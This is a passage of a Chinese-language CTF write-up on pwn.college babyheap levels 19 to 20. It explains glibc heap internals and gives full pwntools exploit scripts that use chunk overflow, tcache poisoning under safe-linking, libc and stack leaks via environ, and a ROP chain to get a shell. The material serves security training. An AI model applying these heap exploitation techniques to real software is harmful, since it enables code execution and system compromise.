class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">256</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;send_flag&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Secret: &quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">16</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;quit&quot;</span>)<br>p.interactive()<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="level19-0"><a href="#level19-0" class="headerlink" title="level19.0"></a>level19.0</h4><p><code>free</code>操作后，会使得<code>ptr[]</code>置0。这里发现每次malloc时，会指定<code>read/write</code>能够操作的size，这里正好是16个字节。因此能够控制下一个chunk header中的PrevSize，Size和<strong>user_data</strong> 。</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">ptr[v6] = <span class="hljs-built_in">malloc</span>(size);<br>nbytes[v6] = size + <span class="hljs-number">16</span>;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>Chunk Overlapping</strong>，具体可见<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/">Chunk Extend and Overlapping - CTF Wiki</a></p>
+<p>在<code>ptmalloc</code>中，获取下一chunk块地址的操作如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></code></pre></td></tr></table></figure>
+
+<p>即使用当前块指针加上当前块大小。</p>
+<p>在<code>ptmalloc</code>中，获取前一chunk块信息的操作如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></code></pre></td></tr></table></figure>
+
+<p>即通过<code>malloc_chunk-&gt;prev_size</code>获取前一chunk块大小，然后使用当前块指针减去前一块大小。</p>
+<p>在<code>ptmalloc</code>中，判断当前chunk是否是use状态的操作如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse(p)</span><br> ((((mchunkptr)(((<span class="hljs-type">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)<br></code></pre></td></tr></table></figure>
+
+<p>即查看下一chunk的<code>prev_inuse</code>域。</p>
+</blockquote>
+<p>当然这里仅是对内存复用的理解，具体可分析：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x00000000</span>: [ Chunk <span class="hljs-keyword">A</span> 的 prev_size ]  // <span class="hljs-number">0</span>（前一个 chunk 在使用，此字段无效）<br><span class="hljs-number">0x00000008</span>: [ Chunk <span class="hljs-keyword">A</span> 的 size      ]  // <span class="hljs-number">0x41（56+8</span>=<span class="hljs-number">64</span>=<span class="hljs-number">0</span>x40，PREV_INUSE=<span class="hljs-number">1</span> → <span class="hljs-number">0</span>x41）<br><span class="hljs-number">0x00000010</span>: [ Chunk <span class="hljs-keyword">A</span> 的用户数据   ]  // <span class="hljs-number">56</span> 字节（实际占用 <span class="hljs-number">0x10~0x47</span>）<br><span class="hljs-number">0x00000048</span>: [ Chunk B 的 prev_size ]  // 位于 <span class="hljs-keyword">A</span> 的用户数据末尾（<span class="hljs-number">0x40~0x47</span>）<br><span class="hljs-number">0x00000050</span>: [ Chunk B 的 size      ]  // <span class="hljs-number">0</span>x41（假设 B 空闲）<br><span class="hljs-number">0x00000058</span>: [ Chunk B 的 fd/bk     ]  // 空闲时用于链表指针<br></code></pre></td></tr></table></figure>
+
+<p>Chunk A的用户数据的最后8个字节存储着Chunk B的<code>prev_size</code>，因此这里可多写<code>16</code>字节能够覆盖Chunk B的用户数据前8个字节，而这8个字节在free后正好是<code>next</code>字段。</p>
+<p>思路是：先<code>malloc</code>三个chunk，然后<code>free</code>后两个，但是需要先<code>free</code>第三个再<code>free</code>第二个，因为第二个chunk和第一个chunk相邻，这样我们才能通过<code>safe_read</code>覆盖BIN的<code>next</code>。</p>
+<p>覆盖<code>next</code>字段使其为第一个chunk的地址（注意safe-linking），因为我们没有将其<code>free</code>，所以后续可以通过<code>safe_write</code>将flag输出。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level19.0&quot;</span>)<br><br><span class="hljs-comment"># get heap_base_address</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 32&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 32&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;safe_write 0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>p.recvline()<br>p.recvline()<br>en_next_mem = u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;en_next: &quot;</span>, <span class="hljs-built_in">hex</span>(en_next_mem))<br>heap_base_addr = en_next_mem &lt;&lt; <span class="hljs-number">12</span><br><br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 1 632&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 2 632&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 3 632&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;safe_read 1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br><br>p.send(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x278</span> + p64(<span class="hljs-number">0x278</span>) + p64((heap_base_addr &gt;&gt; <span class="hljs-number">12</span>) ^ (heap_base_addr + <span class="hljs-number">0x8e0</span>)))<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 2 632&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;read_flag&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/read_flag/safe_write/safe_read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;safe_write 1&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="level19-1"><a href="#level19-1" class="headerlink" title="level19.1"></a>level19.1</h4><p>去掉一个<code>p.recvline()</code>，修改malloc的大小，记住一个TCACHE BIN的包含CHUNK的user_data大小范围为[16(i+1) - 8 + 1, 16(i + 2) - 8], {i&#x3D;1,2,…63}</p>
+<h4 id="level20-0"><a href="#level20-0" class="headerlink" title="level20.0"></a>level20.0</h4><p>这题的api有：<code>[*] Function (malloc/free/safe_write/safe_read/quit): </code></p>
+<p>我们依然可以任意写chunk，但是这题没有相应的flag api和win函数，因此需要进行ROP。</p>
+<p>需要泄露heap基地址，使得我们能够通过写<code>next</code>段到任意地址。需要泄露stack地址，使得我们将<code>next</code>段覆盖为main返回地址存储在栈上的地址，然后构造ROP链拿到shell。</p>
+<p>heap基地址的泄露前面已经做过了，关于stack地址的泄露有一个技巧：通过 <strong><code>environ</code> 环境变量泄露栈地址。</strong> </p>
+<blockquote>
+<p><code>environ</code>是 <code>glibc</code> 定义的全局变量（类型为 <code>char **</code>），存储了程序所有环境变量的指针数组的地址。环境变量（如 <code>PATH</code>、<code>USER</code> 等）位于 <strong>栈空间的高地址区域</strong>，因此 <code>environ</code> 的值本质上是 <strong>栈上的一个地址</strong>。 </p>
+</blockquote>
+<p>关于<code>environ</code>变量的地址：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">pwndbg&gt; p &amp;environ<br><span class="hljs-meta">$1</span> = (&lt;data variable, <span class="hljs-keyword">no</span> <span class="hljs-keyword">debug</span> <span class="hljs-keyword">info</span>&gt; *) <span class="hljs-number">0x7513efb90200</span> &lt;environ&gt;<br>pwndbg&gt; vmmap <span class="hljs-number">0x7513efb90200</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>             <span class="hljs-keyword">Start</span>                <span class="hljs-keyword">End</span> Perm     Size <span class="hljs-keyword">Offset</span> File<br>    <span class="hljs-number">0x7513efb88000</span>     <span class="hljs-number">0x7513efb8a000</span> rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">218000</span> /challenge/lib/libc.so<span class="hljs-number">.6</span><br>►   <span class="hljs-number">0x7513efb8a000</span>     <span class="hljs-number">0x7513efb99000</span> rw-p     f000      <span class="hljs-number">0</span> [anon_7513efb8a] +<span class="hljs-number">0x6200</span><br>    <span class="hljs-number">0x7513efb99000</span>     <span class="hljs-number">0x7513efb9b000</span> r<span class="hljs-comment">--p     2000      0 /challenge/lib/ld-linux-x86-64.so.2</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>libc中有一个environ变量存储了stack地址；因此，得知libc基址也就等于得知了stack地址</strong></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; p &amp;environ<br><span class="hljs-number">$1</span> = (&lt;data variable, no debug info&gt; *) <span class="hljs-number">0x760378a50200</span> &lt;environ&gt;<br>pwndbg&gt; vmmap <span class="hljs-number">0x760378a50200</span><br><span class="hljs-symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA<br>             Start                End Perm     Size Offset File<br>    <span class="hljs-number">0x760378a48000</span>     <span class="hljs-number">0x760378a4a000</span> rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">218000</span> /challenge/lib/libc<span class="hljs-number">.</span>so<span class="hljs-number">.6</span><br>►   <span class="hljs-number">0x760378a4a000</span>     <span class="hljs-number">0x760378a59000</span> rw-p     f000      <span class="hljs-number">0</span> [anon_760378a4a] +<span class="hljs-number">0x6200</span><br>    <span class="hljs-number">0x760378a59000</span>     <span class="hljs-number">0x760378a5b000</span> r--p     <span class="hljs-number">2000</span>      <span class="hljs-number">0</span> /challenge/lib/ld-linux-x86-<span class="hljs-number">64.</span>so<span class="hljs-number">.2</span><br>pwndbg&gt; vmmap<br><span class="hljs-symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA<br>             Start                End Perm     Size Offset File<br>    <span class="hljs-number">0x56629bc53000</span>     <span class="hljs-number">0x56629bc54000</span> r--p     <span class="hljs-number">1000</span>      <span class="hljs-number">0</span> /challenge/babyheap_level20<span class="hljs-number">.0</span><br>    <span class="hljs-number">0x56629bc54000</span>     <span class="hljs-number">0x56629bc56000</span> r-xp     <span class="hljs-number">2000</span>   <span class="hljs-number">1000</span> /challenge/babyheap_level20<span class="hljs-number">.0</span><br>    <span class="hljs-number">0x56629bc56000</span>     <span class="hljs-number">0x56629bc57000</span> r--p     <span class="hljs-number">1000</span>   <span class="hljs-number">3000</span> /challenge/babyheap_level20<span class="hljs-number">.0</span><br>    <span class="hljs-number">0x56629bc57000</span>     <span class="hljs-number">0x56629bc58000</span> r--p     <span class="hljs-number">1000</span>   <span class="hljs-number">3000</span> /challenge/babyheap_level20<span class="hljs-number">.0</span><br>    <span class="hljs-number">0x56629bc58000</span>     <span class="hljs-number">0x56629bc59000</span> rw-p     <span class="hljs-number">1000</span>   <span class="hljs-number">4000</span> /challenge/babyheap_level20<span class="hljs-number">.0</span><br>    <span class="hljs-number">0x56629bc59000</span>     <span class="hljs-number">0x56629bc5a000</span> rw-p     <span class="hljs-number">1000</span>   <span class="hljs-number">6000</span> /challenge/babyheap_level20<span class="hljs-number">.0</span><br>    <span class="hljs-number">0x56629bc5a000</span>     <span class="hljs-number">0x56629bc5b000</span> rw-p     <span class="hljs-number">1000</span>   <span class="hljs-number">7000</span> /challenge/babyheap_level20<span class="hljs-number">.0</span><br>    <span class="hljs-number">0x56629c446000</span>     <span class="hljs-number">0x56629c467000</span> rw-p    <span class="hljs-number">21000</span>      <span class="hljs-number">0</span> [heap]<br>    <span class="hljs-number">0x76037882c000</span>     <span class="hljs-number">0x76037882f000</span> rw-p     <span class="hljs-number">3000</span>      <span class="hljs-number">0</span> [anon_76037882c]<br>    <span class="hljs-number">0x76037882f000</span>     <span class="hljs-number">0x760378857000</span> r--p    <span class="hljs-number">28000</span>      <span class="hljs-number">0</span> /challenge/lib/libc<span class="hljs-number">.</span>so<span class="hljs-number">.6</span><br>    <span class="hljs-number">0x760378857000</span>     <span class="hljs-number">0x7603789ec000</span> r-xp   <span class="hljs-number">195000</span>  <span class="hljs-number">28000</span> /challenge/lib/libc<span class="hljs-number">.</span>so<span class="hljs-number">.6</span><br>    <span class="hljs-number">0x7603789ec000</span>     <span class="hljs-number">0x760378a44000</span> r--p    <span class="hljs-number">58000</span> 1bd000 /challenge/lib/libc<span class="hljs-number">.</span>so<span class="hljs-number">.6</span><br>    <span class="hljs-number">0x760378a44000</span>     <span class="hljs-number">0x760378a48000</span> r--p     <span class="hljs-number">4000</span> <span class="hljs-number">214000</span> /challenge/lib/libc<span class="hljs-number">.</span>so<span class="hljs-number">.6</span><br>    <span class="hljs-number">0x760378a48000</span>     <span class="hljs-number">0x760378a4a000</span> rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">218000</span> /challenge/lib/libc<span class="hljs-number">.</span>so<span class="hljs-number">.6</span><br>    <span class="hljs-number">0x760378a4a000</span>     <span class="hljs-number">0x760378a59000</span> rw-p     f000      <span class="hljs-number">0</span> [anon_760378a4a]<br>    <span class="hljs-number">0x760378a59000</span>     <span class="hljs-number">0x760378a5b000</span> r--p     <span class="hljs-number">2000</span>      <span class="hljs-number">0</span> /challenge/lib/ld-linux-x86-<span class="hljs-number">64.</span>so<span class="hljs-number">.2</span><br>    <span class="hljs-number">0x760378a5b000</span>     <span class="hljs-number">0x760378a85000</span> r-xp    2a000   <span class="hljs-number">2000</span> /challenge/lib/ld-linux-x86-<span class="hljs-number">64.</span>so<span class="hljs-number">.2</span><br>    <span class="hljs-number">0x760378a85000</span>     <span class="hljs-number">0x760378a90000</span> r--p     b000  2c000 /challenge/lib/ld-linux-x86-<span class="hljs-number">64.</span>so<span class="hljs-number">.2</span><br>    <span class="hljs-number">0x760378a91000</span>     <span class="hljs-number">0x760378a93000</span> r--p     <span class="hljs-number">2000</span>  <span class="hljs-number">37000</span> /challenge/lib/ld-linux-x86-<span class="hljs-number">64.</span>so<span class="hljs-number">.2</span><br>    <span class="hljs-number">0x760378a93000</span>     <span class="hljs-number">0x760378a95000</span> rw-p     <span class="hljs-number">2000</span>  <span class="hljs-number">39000</span> /challenge/lib/ld-linux-x86-<span class="hljs-number">64.</span>so<span class="hljs-number">.2</span><br>    <span class="hljs-number">0x7ffcd6feb000</span>     <span class="hljs-number">0x7ffcd700c000</span> rw-p    <span class="hljs-number">21000</span>      <span class="hljs-number">0</span> [stack]<br>    <span class="hljs-number">0x7ffcd70d3000</span>     <span class="hljs-number">0x7ffcd70d7000</span> r--p     <span class="hljs-number">4000</span>      <span class="hljs-number">0</span> [vvar]<br>    <span class="hljs-number">0x7ffcd70d7000</span>     <span class="hljs-number">0x7ffcd70d9000</span> r-xp     <span class="hljs-number">2000</span>      <span class="hljs-number">0</span> [vdso]<br><span class="hljs-number">0xffffffffff600000</span> <span class="hljs-number">0xffffffffff601000</span> --xp     <span class="hljs-number">1000</span>      <span class="hljs-number">0</span> [vsyscall]<br>pwndbg&gt; p/x <span class="hljs-number">0x760378a50200</span>-<span class="hljs-number">0x76037882f000</span><br><span class="hljs-number">$2</span> = <span class="hljs-number">0x221200</span><br></code></pre></td></tr></table></figure>
+
+<p>利用<code>libc_base_addr</code>拿到environ变量的地址。然后再通过写next，拿到<code>stack_addr</code>。</p>
+<p>拿到<code>stack_addr</code>后根据偏移算出<code>ret_addr</code>。最后构造ROP链，将其通过<code>safe_read</code>写入其中。最后quit即可拿到Shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level20.0&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/challenge/lib/libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">idx,size</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/safe_write/safe_read/quit): &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;malloc&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/safe_write/safe_read/quit): &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;free&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_write</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/safe_write/safe_read/quit): &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;safe_write&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_read</span>(<span class="hljs-params">idx,content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/safe_write/safe_read/quit): &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;safe_read&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br>    sleep(<span class="hljs-number">0.1</span>)<br>    p.send(content)<br><br><br><span class="hljs-comment"># get heap_base_address</span><br>malloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>)<br>free(<span class="hljs-number">0</span>)<br>malloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>)<br>safe_write(<span class="hljs-number">0</span>)<br>p.recvline()<br>p.recvline()<br>en_next_mem = u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;en_next: &quot;</span>, <span class="hljs-built_in">hex</span>(en_next_mem))<br>heap_base_addr = en_next_mem &lt;&lt; <span class="hljs-number">12</span><br><br><span class="hljs-comment"># get libc_base_address</span><br>malloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x38</span>)<br>malloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x38</span>)<br>malloc(<span class="hljs-number">2</span>, <span class="hljs-number">0x38</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># 注意这里在heap区找到偏移0x358处存储着libc上的地址，但是无法直接将偏移设置为0x358，因为safe-linking的原因，地址末尾必须为0</span><br><span class="hljs-comment"># 同时，也不能为0x350。因为每次malloc时会将key清空，此时清空的就是libc上的地址。</span><br><span class="hljs-comment"># 因此，这里采用0x340</span><br>safe_read(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x41</span>) + p64((heap_base_addr &gt;&gt; <span class="hljs-number">12</span>) ^ (heap_base_addr + <span class="hljs-number">0x340</span>)))<br>malloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x38</span>)<br>malloc(<span class="hljs-number">3</span>, <span class="hljs-number">0x38</span>)     <span class="hljs-comment"># 3-&gt;leak_libc</span><br>safe_read(<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>)<br>safe_write(<span class="hljs-number">3</span>)<br>p.recvline()<br>p.recvline()<br>p.recv(<span class="hljs-number">0x18</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21a6a0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base_addr:&quot;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># get stack_address</span><br>environ_addr = libc_base + <span class="hljs-number">0x221200</span><br>malloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x38</span>)<br>malloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x38</span>)<br>malloc(<span class="hljs-number">2</span>, <span class="hljs-number">0x38</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>safe_read(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x41</span>) + p64((heap_base_addr &gt;&gt; <span class="hljs-number">12</span>) ^ environ_addr))<br>malloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x38</span>)<br>malloc(<span class="hljs-number">3</span>, <span class="hljs-number">0x38</span>)     <span class="hljs-comment"># 3-&gt;environ</span><br>safe_write(<span class="hljs-number">3</span>)<br>p.recvline()<br>p.recvline()<br>stack_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span 